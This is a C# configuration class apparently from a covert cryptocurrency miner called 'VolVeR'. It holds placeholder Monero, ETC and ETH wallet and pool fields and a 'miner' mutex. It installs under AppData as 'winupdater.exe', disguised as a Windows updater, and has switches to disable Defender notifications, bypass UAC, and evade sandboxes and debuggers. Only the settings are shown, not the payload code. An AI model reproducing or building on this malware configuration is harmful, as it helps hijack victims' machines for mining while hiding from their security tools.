using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VolVeR
{

    internal class config
    {
        public static string moneroUsage = "25";
        public static string moneroWallet = "monowallet";
        public static string moneroPool = "monopool";
        public static string etcWallet = "etcwallet";
        public static string etcPool = "etcpool";
        public static string ethWallet = "ethwallet";
        public static string ethPool = "ethpool";
        public static string ethWorker = "ethwork";
        public static string etcWorker = "etcwork";
        public static string mutex = "miner-pykypaljobplwfm";
        public static string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows");
        public static string FileName = "winupdater" + ".exe";
        public static string disableDefenderNotifications = "defender";
        public static string bypassUAC = "uac";
        public static string antiSandbox = "antisand";
        public static string antiDebugger = "debug";


    }
}
 
